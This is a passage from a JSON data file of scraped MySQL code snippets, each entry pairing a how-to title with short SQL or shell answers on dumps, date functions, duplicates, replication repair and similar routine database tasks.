    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2113,
    "keyword": null,
    "link": null,
    "title": " mysql dump structure only",
    "description": "mysqldump -u root -p --no-data dbname > schema.sql\nmysqldump -d -u someuser -p mydatabase products categories users\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2114,
    "keyword": null,
    "link": null,
    "title": " mysql dump with table query",
    "description": "mysqldump db_name table_name --where=\"id > 1\"\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2115,
    "keyword": null,
    "link": null,
    "title": " mysql else if",
    "description": "IF condition1 THEN     statements; ELSEIF condition2 THEN # OPTIONAL \tstatements; ELSE # OPTIONAL     statements; END IF;\n-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result;\nIF condition THEN    statements; ELSE    else-statements; END IF;\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2116,
    "keyword": null,
    "link": null,
    "title": " mysql empty a table",
    "description": "-- If you do not need a condition or limit the rows: TRUNCATE TABLE tblYourTable; -- Not Foreign key constrained  -- Or  SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE YourTable1; TRUNCATE YourTable2;  SET FOREIGN_KEY_CHECKS = 1;  -- -------------------------------------------------------- -- Otherwise: DELETE FROM tblYourTable WHERE condition;  -- Or  DELETE FROM tblYourTable LIMIT row_count;\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2117,
    "keyword": null,
    "link": null,
    "title": " mysql enter ubuntu",
    "description": " mysql -u root -p\n",
    "reg_date": "2021-10-12T09:57:11.000Z"
  },
  {
    "id": 2118,
    "keyword": null,
    "link": null,
    "title": " mysql error 1146",
    "description": "#To fix the replication error follow the steps below.  #1. First, we log into the MYSQL.  mysql -u root -p   #2. On the MySQL shell, we check the slave status.  mysql> SHOW SLAVE STATUS  #The sample result as follows.  mysql> SHOW SLAVE STATUS *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 1.2.3.4 Master_User: slave_user Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.001089 Read_Master_Log_Pos: 269214467 Relay_Log_File: slave-relay.000234 Relay_Log_Pos: 100125935 Relay_Master_Log_File: mysql-bin.001079 Slave_IO_Running: Yes Slave_SQL_Running: No Replicate_Do_DB: mydb Last_Errno: 1146   #If anyone of the Slave_IO_Running or Slave_SQL_Running is set as NO, it means the replication is broken. #So, we start to repair the MYSQL replication.  #3. For that, we stop the slave from replication, using the below command.  mysql> STOP SLAVE;  #4. Next, we tell the slave to simply skip the invalid SQL query. So we use the below command.  mysql> SET GLOBAL SQL_SLAVE_SKIP_COUNTER = 1;  #This query tells the slave to skip one query (which is the invalid one that caused the replication to stop).  If we like to skip two queries, we use the following code instead.  SET GLOBAL SQL_SLAVE_SKIP_COUNTER = 2; #That&rsquo;s it.  #5. Again, we start the slave.  mysql> START SLAVE;  #6. After that, we check if replication is working again.  mysql> SHOW SLAVE STATUS  mysql> SHOW SLAVE STATUS *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 1.2.3.4 Master_User: slave_user Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.001089 Read_Master_Log_Pos: 269214467 Relay_Log_File: slave-relay.000234 Relay_Log_Pos: 100125935 Relay_Master_Log_File: mysql-bin.001079 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: mydb Last_Errno: 1146   #Both Slave_IO_Running and Slave_SQL_Running are set to Yes now. And the replication is running without any error. #Then we leave the MySQL shell.  mysql> quit;\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2119,
    "keyword": null,
    "link": null,
    "title": " mysql error 1251",
    "description": "mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'your_new_password'; mysql> FLUSH PRIVILEGES; mysql> quit\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2120,
    "keyword": null,
    "link": null,
    "title": " mysql error codeigniter",
    "description": "$this->db->_error_message();\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2121,
    "keyword": null,
    "link": null,
    "title": " mysql event last execution",
    "description": "SELECT * FROM INFORMATION_SCHEMA.events;\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2122,
    "keyword": null,
    "link": null,
    "title": " mysql events not work",
    "description": "SET GLOBAL event_scheduler = ON; SHOW PROCESSLIST; select @@event_scheduler;  it will return ON\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2123,
    "keyword": null,
    "link": null,
    "title": " mysql execute file",
    "description": "mysql> source \\home\\user\\Desktop\\test.sql;\nmysql -u yourusername -p yourpassword yourdatabase < text_file\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2124,
    "keyword": null,
    "link": null,
    "title": " mysql execute query if condition",
    "description": "-- PL/SQL BEGIN     IF my_val = 1 THEN [...]     ELSE [...]     END IF; END; -- In a query SELECT CASE WHEN my_col = 1 THEN 'Ok' ELSE 'Ko' END AS my_result;\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2125,
    "keyword": null,
    "link": null,
    "title": " mysql export and import",
    "description": "1. Export DB: mysqldump -u root -p DB_NAME > 18_06_21.sql  2. import DB: mysql -u root -h HOST_IP -p DB_NAME < 18_06_21.sql\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2126,
    "keyword": null,
    "link": null,
    "title": " mysql export database command line",
    "description": "mysqldump -u username -p dbname > dbexport.sql \nmysqldump -uroot -p root YourDatabaseName > WantedSQLFile.sql \nmysqldump --databases --user=root --password your_db_name > export_into_db.sql  \nmysqldump -u [username] -p [database-you-want-to-dump] > [path-to-place-data-dump] \nset path=c:\\wamp\\bin\\mysql\\mysql5.1.36\\bin \n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2127,
    "keyword": null,
    "link": null,
    "title": " mysql extract month",
    "description": "SELECT EXTRACT(MONTH FROM '2020-07-05')\nSELECT EXTRACT(DAY FROM '2020-07-05')\n",
    "reg_date": "2021-10-12T09:57:12.000Z"
  },
  {
    "id": 2128,
    "keyword": null,
    "link": null,
    "title": " mysql extract month from date",
    "description": "SELECT MONTH(field_name) as month FROM yourtable \nSELECT EXTRACT(MONTH FROM '2020-07-05')\nSELECT MONTHNAME(column_date,&rsquo;%m&rsquo;)) as monthname from tablename;\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2129,
    "keyword": null,
    "link": null,
    "title": " mysql f# examples",
    "description": "let connectionStr = \"Data Source=localhost; Port=3306; User ID=root; Password=q1w2e3;\" let connection : IDbConnection = upcast new MySql.Data.MySqlClient.MySqlConnection(connectionStr) \n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2130,
    "keyword": null,
    "link": null,
    "title": " mysql factorial stored procedure example",
    "description": "delimiter // CREATE PROCEDURE fact(IN x BIGINT) BEGIN DECLARE result BIGINT; DECLARE i BIGINT; SET result = 1; SET i = 1; WHILE i <= x DO SET result = result * i; SET i = i + 1; END WHILE; SELECT x AS Number, result as Factorial; END// delimiter ;\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2131,
    "keyword": null,
    "link": null,
    "title": " mysql failed to login as root@localhost",
    "description": "UPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES; \n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2132,
    "keyword": null,
    "link": null,
    "title": " mysql filter by date mount",
    "description": "SELECT DATE_FORMAT(test_date,'%Y%m') AS date FROM test_table;\nSELECT *  FROM customers  WHERE birthday LIKE \"2015/04/%\"; \n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2133,
    "keyword": null,
    "link": null,
    "title": " mysql find and replace",
    "description": "UPDATE     table_name SET     column_name = REPLACE(column_name, 'text to find', 'text to replace with') WHERE     column_name LIKE '%text to find%';\nREPLACE(str, find_string, replace_with) \nUPDATE `table` SET `column` = replace(`column`, 'find text', 'replace text')\nUPDATE products SET  productDescription = REPLACE(productDescription,'abuot','about');\n#REPLACE(string, from_string, new_string) SELECT REPLACE(myText, \"a\", \"b\") as myText FROM tableText;\n#Search, Update & Replace Query  UPDATE `tblname` SET `description`= REPLACE(`description`, 'old name', 'New Name') WHERE `description` LIKE '%old name%';\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2134,
    "keyword": null,
    "link": null,
    "title": " mysql find db contarint",
    "description": "select * from information_schema.key_column_usage where constraint_name='[CONSTRAINT_NAME]'\nselect COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_COLUMN_NAME, REFERENCED_TABLE_NAME from information_schema.KEY_COLUMN_USAGE where TABLE_NAME = 'users';\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2135,
    "keyword": null,
    "link": null,
    "title": " mysql find duplicates in same table",
    "description": "SELECT name, COUNT(*) c FROM table GROUP BY name HAVING c > 1;\nSELECT col, COUNT(col) FROM table_name GROUP BY col HAVING COUNT(col) > 1;\nSELECT      col1, COUNT(col1),     col2, COUNT(col2) FROM     table_name GROUP BY      col1,      col2 HAVING         (COUNT(col1) > 1) AND         (COUNT(col2) > 1); \n## Find ALL duplicate recods by value (without grouping them by value) ## # to find the duplicate,  # replace all instances of tableName with your table name # and all instances of duplicateField with the field name where you look for duplicates SELECT t1.* FROM tableName AS t1 INNER JOIN( \tSELECT duplicateField \tFROM tableName \tGROUP BY duplicateField \tHAVING COUNT(duplicateField) > 1 )temp ON t1.duplicateField = temp.duplicateField order by duplicateField\n                                                     SELECT      col,      COUNT(col) FROM     table_name GROUP BY col HAVING COUNT(col) > 1; Code language: SQL (Structured Query Language) (sql)\n# Duplicate rows or row INSERT INTO table (col1, col2, col3) SELECT col1, col2, col3 FROM table WHERE something...;\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2136,
    "keyword": null,
    "link": null,
    "title": " mysql find foreign key references",
    "description": "SELECT   TABLE_NAME,   COLUMN_NAME,   CONSTRAINT_NAME,   -- <<-- the one you want!    REFERENCED_TABLE_NAME,   REFERENCED_COLUMN_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE   REFERENCED_TABLE_NAME = 'My_Table';\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2137,
    "keyword": null,
    "link": null,
    "title": " mysql find max value row",
    "description": "SELECT t1.* FROM employees t1 INNER JOIN (     SELECT id, max(salary) AS salary FROM employees GROUP BY id ) t2 ON t1.id = t2.id AND t1.salary = t2.salary;\nSELECT a.id, a.rev, a.contents FROM YourTable a INNER JOIN (     SELECT id, MAX(rev) rev     FROM YourTable     GROUP BY id ) b ON a.id = b.id AND a.rev = b.rev \n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2138,
    "keyword": null,
    "link": null,
    "title": " mysql find missing values",
    "description": "-- Find missing t1 values in t2 (based on 'id' field) SELECT * FROM t1 WHERE t1.id NOT IN (SELECT id FROM t2); -- or SELECT * FROM t1 WHERE NOT exists (     SELECT NULL FROM t2 WHERE t2.id = t1.id ); -- or SELECT t1.* FROM t1 LEFT OUTER JOIN t2 ON t2.id = t1.id WHERE t2.id IS NULL;\n",
    "reg_date": "2021-10-12T09:57:13.000Z"
  },
  {
    "id": 2139,
    "keyword": null,
    "link": null,
    "title": " mysql find most common value",
    "description": "SELECT column, COUNT(*) AS magnitude  FROM table  GROUP BY column  ORDER BY magnitude DESC LIMIT 1\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2140,
    "keyword": null,
    "link": null,
    "title": " mysql find non alphanumeric characters",
    "description": "/*find rows in mysql with non-alphanumeric chars*/ SELECT * FROM user WHERE first_name REGEXP \"[^A-Za-z0-9]+\";  /*find rows with non-alphanumeric or space chars*/ SELECT * FROM user WHERE first_name REGEXP \"[^A-Za-z0-9[:space:]]+\";\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2141,
    "keyword": null,
    "link": null,
    "title": " mysql find tables with column name",
    "description": "SELECT DISTINCT TABLE_NAME      FROM INFORMATION_SCHEMA.COLUMNS     WHERE COLUMN_NAME IN ('columnA','ColumnB')         AND TABLE_SCHEMA='YourDatabase';\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2142,
    "keyword": null,
    "link": null,
    "title": " mysql find tables with name",
    "description": "SELECT table_name  FROM information_schema.tables  WHERE table_type = 'base table' AND table_name like '%YOUR TABLE NAME%';\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2143,
    "keyword": null,
    "link": null,
    "title": " mysql first day of month",
    "description": "SELECT DATEADD(yy, DATEDIFF(yy, 0, GETDATE()), 0);\t\t\t-- SQL Server SELECT TRUNC(sysdate, 'YEAR') FROM DUAL;\t\t\t\t\t-- Oracle SELECT MAKEDATE(year(now()), 1);\t\t\t\t\t\t\t-- MySQL\n-- Replace curdate() with your date column SELECT curdate(),  \tDATE_SUB( curdate(), INTERVAL DAYOFMONTH(curdate())-1 DAY ) AS '1st of month';\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2144,
    "keyword": null,
    "link": null,
    "title": " mysql first day of year",
    "description": "SELECT DATEADD(yy, DATEDIFF(yy, 0, GETDATE()), 0);\t\t\t-- SQL Server SELECT TRUNC(sysdate, 'YEAR') FROM DUAL;\t\t\t\t\t-- Oracle SELECT MAKEDATE(year(now()), 1);\t\t\t\t\t\t\t-- MySQL\n-- Replace curdate() with your date column SELECT curdate(),  \tDATE_SUB( curdate(), INTERVAL DAYOFMONTH(curdate())-1 DAY ) AS '1st of month';\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2145,
    "keyword": null,
    "link": null,
    "title": " mysql fixed",
    "description": "column_name DECIMAL(precision, scale) -- DECIMAL stores exact numeric values with a fixed decimal point. -- The precision is the total number of digits before AND after the decimal point. -- The scale is the number of digits after the decimal point.\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2146,
    "keyword": null,
    "link": null,
    "title": " mysql fixed point number",
    "description": "column_name DECIMAL(precision, scale) -- DECIMAL stores exact numeric values with a fixed decimal point. -- The precision is the total number of digits before AND after the decimal point. -- The scale is the number of digits after the decimal point.\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2147,
    "keyword": null,
    "link": null,
    "title": " mysql float",
    "description": "column_name DECIMAL(precision, scale) -- DECIMAL stores exact numeric values with a fixed decimal point. -- The precision is the total number of digits before AND after the decimal point. -- The scale is the number of digits after the decimal point.\nFLOAT(P)    where P is precision 0 to 53 FLOAT(M,D)    where M is the total number of digits and D is the number of digits after the decimal point\n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2148,
    "keyword": null,
    "link": null,
    "title": " mysql foreign key constraints",
    "description": " ALTER TABLE Orders ADD CONSTRAINT FK_PersonOrder FOREIGN KEY (PersonID) REFERENCES Persons(PersonID); \n",
    "reg_date": "2021-10-12T09:57:14.000Z"
  },
  {
    "id": 2149,
    "keyword": null,
    "link": null,
    "title": " mysql format date",
    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\nDATE_FORMAT(NOW(),'%M %e, %Y @ %h:%i %p')  #Format is 'June 10, 2014 @ 06:52 PM'\n-- Converts 'dd.mm.yyyy' to date\t(my_date_col is VARCHAR) SELECT STR_TO_DATE(my_date_col,'%d.%m.%Y') AS my_strdate FROM my_table; -- Converts 'dd.mm.yyyy' to 'YYYY-MM-DD' SELECT DATE_FORMAT(STR_TO_DATE(my_date_col,'%d.%m.%Y'), '%Y-%m-%d') AS my_strdate \tFROM my_table;\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nuse \\Datetime;  $now = new DateTime(); echo $now->format('Y-m-d H:i:s');    // MySQL datetime format echo $now->getTimestamp();           // Unix Timestamp -- Since PHP 5.3 \nDECLARE df VARCHAR(20); DECLARE dt VARCHAR(20);  SET df = DATE_FORMAT(_Datefrom,'%Y-%m-%d 00:00:00');  SET dt = DATE_FORMAT(_DateTo,'%Y-%m-%d 23:59:59');\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2150,
    "keyword": null,
    "link": null,
    "title": " mysql format des dates",
    "description": "DATE : stocke une date au format AAAA-MM-JJ (Ann&eacute;e-Mois-Jour) ;  TIME : stocke un moment au format HH:MM:SS (Heures:Minutes:Secondes) ;  DATETIME : stocke la combinaison d'une date et d'un moment de la journ&eacute;e au format AAAA-MM-JJ HH:MM:SS. Ce type de champ est donc plus pr&eacute;cis ;  TIMESTAMP : stocke le nombre de secondes pass&eacute;es depuis le 1er janvier 1970 &agrave; 00 h 00 min 00 s ;  YEAR : stocke une ann&eacute;e, soit au format AA, soit au format AAAA.\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2151,
    "keyword": null,
    "link": null,
    "title": " mysql format number leading zeros",
    "description": "Here&rsquo;s an example of padding a single digit number with two zeros:  SELECT LPAD(7, 3, 0); Result:  +---------------+ | LPAD(7, 3, 0) | +---------------+ | 007           | +---------------+ In this case, two leading zeros were added because we specified 3 as the required length.  So if we start with a two digit number, only one zero is added:  SELECT LPAD(17, 3, 0); Result:  +----------------+ | LPAD(17, 3, 0) | +----------------+ | 017            | +----------------+ Non-Zero Values The LPAD() function isn&rsquo;t limited to just zeros. As mentioned, it can be used to pad any string with any other string. So you can pad a number with leading 1s, or leading letters, or other symbols if required.  SELECT LPAD(7, 10, '.'); Result:  +------------------+ | LPAD(7, 10, '.') | +------------------+ | .........7       | +------------------+ And because it&rsquo;s actually a string function, it can be used to pad any non-numeric string. And it&rsquo;s not limited to just one padding character &ndash; it can be padded with multiple characters if need be:  SELECT LPAD('Cat', 21, 'Meow! ') AS Result; Result:  +-----------------------+ | Result                | +-----------------------+ | Meow! Meow! Meow! Cat | +-----------------------+\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2152,
    "keyword": null,
    "link": null,
    "title": " mysql function ro creat a table",
    "description": "                                     DELIMITER $$  CREATE PROCEDURE GetCustomerLevel(     IN  customerNo INT,       OUT customerLevel VARCHAR(20) ) BEGIN  \tDECLARE credit DEC(10,2) DEFAULT 0;          -- get credit limit of a customer     SELECT  \t\tcreditLimit  \tINTO credit     FROM customers     WHERE  \t\tcustomerNumber = customerNo;          -- call the function      SET customerLevel = CustomerLevel(credit); END$$  DELIMITER ;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2153,
    "keyword": null,
    "link": null,
    "title": " mysql function variable",
    "description": "CREATE PROCEDURE p(increment INT) BEGIN   DECLARE counter INT DEFAULT 0;   WHILE counter < 10 DO     -- ... do work ...     SET counter = counter + increment;   END WHILE; END;\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2154,
    "keyword": null,
    "link": null,
    "title": " mysql generate uuid",
    "description": "SELECT UUID();\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2155,
    "keyword": null,
    "link": null,
    "title": " mysql get age from date",
    "description": "SELECT DATEDIFF(CURRENT_DATE, STR_TO_DATE(t.birthday, '%d-%m-%Y'))/365 AS ageInYears   FROM YOUR_TABLE t \nSELECT YEAR(CURRENT_DATE)-YEAR(t.birthday) AS ageInYears   FROM YOUR_TABLE t \n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2156,
    "keyword": null,
    "link": null,
    "title": " mysql get character set",
    "description": "SELECT default_character_set_name FROM information_schema.SCHEMATA  WHERE schema_name = \"schemaname\";\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2157,
    "keyword": null,
    "link": null,
    "title": " mysql get column names from table",
    "description": "SELECT `COLUMN_NAME`  FROM `INFORMATION_SCHEMA`.`COLUMNS`  WHERE `TABLE_SCHEMA`='yourdatabasename'      AND `TABLE_NAME`='yourtablename'; \nSELECT COLUMN_NAME   FROM INFORMATION_SCHEMA.COLUMNS   WHERE TABLE_SCHEMA = 'my_database' AND TABLE_NAME = 'my_table'; \nSELECT table_name, column_name from information_schema.columns WHERE column_name LIKE '%column_name_to_search%';\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2158,
    "keyword": null,
    "link": null,
    "title": " mysql get count of rows",
    "description": "SELECT COUNT(*) FROM my_table; SELECT COUNT(*) FROM my_table WHERE my_column IS NULL; SELECT COUNT(*) FROM my_table WHERE my_column = 'my_value'; SELECT COUNT(DISTINCT tel) gender_count,        COUNT(DISTINCT CASE WHEN gender = 'male'   THEN tel END) male_count,        COUNT(DISTINCT CASE WHEN gender = 'female' THEN tel END) female_count FROM people;\n",
    "reg_date": "2021-10-12T09:57:15.000Z"
  },
  {
    "id": 2159,
    "keyword": null,
    "link": null,
    "title": " mysql get date diff in months",
    "description": "SELECT TIMESTAMPDIFF(MONTH, '2012-05-05', '2012-06-15')\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2160,
    "keyword": null,
    "link": null,
    "title": " mysql get date difference in hours",
    "description": "SELECT TIMESTAMPDIFF(HOUR, '2021-05-22 07:00:00', '2021-05-22 12:00:37') as time_diff_in_hours;\nSELECT TIMESTAMPDIFF(MONTH, '2012-05-05', '2012-06-15')\n-- With implicit CAST SELECT * FROM my_table  \tWHERE my_date BETWEEN '2021-06-01 01:12:00' AND '2021-06-30 23:59:59'; -- is EQUIVALENT to SELECT * FROM my_table  \tWHERE my_date >= '2021-06-01 01:12:00' AND my_col <= '2021-06-30 23:59:59';\nSELECT TIME_TO_SEC(TIMEDIFF('2021-05-22 12:00:00', '2021-05-22 12:00:37')) as diff_in_seconds;\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2161,
    "keyword": null,
    "link": null,
    "title": " mysql get date from datetime",
    "description": "SELECT  date_format(datecol, '%H:%i:%s') as 'time' FROM table; -- eg. 10:33:10\nCURRENT_TIME return HH:ii:ss format time in mysql\nWHERE DATE(datetime) = '2009-10-20'\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2162,
    "keyword": null,
    "link": null,
    "title": " mysql get day of week",
    "description": "DAYOFWEEK(date) \nDAYOFWEEK();//(1 for Sunday,2 for Monday &acirc;&euro;&brvbar;&acirc;&euro;&brvbar; 7 for Saturday )\nSELECT WEEKDAY(date);\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2163,
    "keyword": null,
    "link": null,
    "title": " mysql get db name",
    "description": "SELECT DATABASE();\nCopySELECT database(); \n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2164,
    "keyword": null,
    "link": null,
    "title": " mysql get domain from url",
    "description": "SUBSTRING_INDEX(SUBSTRING_INDEX(SUBSTRING_INDEX(SUBSTRING_INDEX(target_url, '/', 3), '://', -1), '/', 1), '?', 1) AS domain\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2165,
    "keyword": null,
    "link": null,
    "title": " mysql get first 2 characters of string",
    "description": "SELECT LEFT(first_name , 2) FROM users; \n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2166,
    "keyword": null,
    "link": null,
    "title": " mysql get first x characters",
    "description": "SELECT LEFT(title , 10) FROM articles; \nSELECT author FROM lyrics WHERE author LIKE 'B%';\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2167,
    "keyword": null,
    "link": null,
    "title": " mysql get last 2 month data",
    "description": "SELECT * FROM d_jobs WHERE  `job_date` >= last_day(now()) + interval 1 day - interval 3 month;\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2168,
    "keyword": null,
    "link": null,
    "title": " mysql get last day of month",
    "description": "SELECT LAST_DAY(CURDATE());\t\t\t\t\t\t-- Current month SELECT LAST_DAY(CURDATE() - INTERVAL 1 MONTH);\t-- Previous month SELECT LAST_DAY(CURDATE() + INTERVAL 1 MONTH);\t-- Next month\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2169,
    "keyword": null,
    "link": null,
    "title": " mysql get last insert id",
    "description": "-- For mysql INSERT INTO table_name (col1, col2,...) VALUES ('val1', 'val2'...); SELECT LAST_INSERT_ID();\nSELECT MAX(id) AS last_id FROM users -- last_id -- -- 33 --\nSET @last_id = LAST_INSERT_ID();\n-- To get the last inserted auto-increment row ID: -- SELECT LAST_INSERT_ID( optional_expression )  -- If you have just inserted it using a command in C# use: -- int lastId = (Int32)yourCommand.LastInsertedId;\n//laravel controller $newOrder = new Order(); ... ... $newOrder->save();  $last_id = $newOrder->id;\n",
    "reg_date": "2021-10-12T09:57:16.000Z"
  },
  {
    "id": 2170,
    "keyword": null,
    "link": null,
    "title": " mysql get last inserted id",
    "description": "SELECT MAX(id) AS last_id FROM users -- last_id -- -- 33 --\n$this_id = mysqli_insert_id($db);\n-- To get the last inserted auto-increment row ID: -- SELECT LAST_INSERT_ID( optional_expression )  -- If you have just inserted it using a command in C# use: -- int lastId = (Int32)yourCommand.LastInsertedId;\n//laravel controller $newOrder = new Order(); ... ... $newOrder->save();  $last_id = $newOrder->id;\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2171,
    "keyword": null,
    "link": null,
    "title": " mysql get last row",
    "description": "SELECT fields FROM table ORDER BY id DESC LIMIT 1;\nSELECT * FROM tableName ORDER BY col1 DESC LIMIT 10;\nSELECT lastName,firstName FROM Customer        WHERE lastName LIKE \"B%\"          AND city = \"Indianapolis\"          AND (phone LIKE \"%8%\" OR fax LIKE \"%8%\")\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2172,
    "keyword": null,
    "link": null,
    "title": " mysql get latest duplicate rows",
    "description": "SELECT    t1.primary_id,    t1.duplicate_id,    t1.data1,    t1.data2 FROM    table_name t1 LEFT JOIN table_name t2 \tON (t1.duplicate_id = t2.duplicate_id AND t1.primary_id < t2.primary_id)  WHERE \tt2.primary_id IS NULL  \n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2173,
    "keyword": null,
    "link": null,
    "title": " mysql get longest string in column",
    "description": "ORDER BY LENGTH(description) DESC LIMIT 1\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2174,
    "keyword": null,
    "link": null,
    "title": " mysql get max value and id",
    "description": "SELECT a.id, a.rev, a.contents FROM YourTable a INNER JOIN (     SELECT id, MAX(rev) rev     FROM YourTable     GROUP BY id ) b ON a.id = b.id AND a.rev = b.rev \n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2175,
    "keyword": null,
    "link": null,
    "title": " mysql get nth highest",
    "description": "CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INT BEGIN   SET N = N-1;      RETURN (       # Where Salary is your column name and Employee your table       SELECT DISTINCT(Salary) FROM Employee ORDER BY Salary DESC LIMIT N, 1   ); END\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2176,
    "keyword": null,
    "link": null,
    "title": " mysql get seconds from datetime",
    "description": "SECOND(created_at)\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2177,
    "keyword": null,
    "link": null,
    "title": " mysql get table size",
    "description": "SELECT   TABLE_NAME AS `Table`,   ROUND((DATA_LENGTH + INDEX_LENGTH) / 1024 / 1024) AS `Size (MB)` FROM   information_schema.TABLES WHERE   TABLE_SCHEMA = \"bookstore\" ORDER BY   (DATA_LENGTH + INDEX_LENGTH) DESC; \nSELECT pg_size_pretty( pg_total_relation_size('tablename') ); (postgres)\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2178,
    "keyword": null,
    "link": null,
    "title": " mysql get time from datetime",
    "description": "SELECT  date_format(datecol, '%H:%i:%s') as 'time' FROM table; -- eg. 10:33:10\nWHERE DATE(datetime) = '2009-10-20'\nSECOND(created_at)\n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2179,
    "keyword": null,
    "link": null,
    "title": " mysql get year from date",
    "description": "select *  from orders  where order_date >= DATE_SUB(NOW(),INTERVAL 1 YEAR);\nYEAR(my_date)\nSELECT book_name,dt_of_pub,YEAR(dt_of_pub) FROM book_mast WHERE YEAR(dt_of_pub)>2003;  \n",
    "reg_date": "2021-10-12T09:57:17.000Z"
  },
  {
    "id": 2180,
    "keyword": null,
    "link": null,
    "title": " mysql get yesterday",
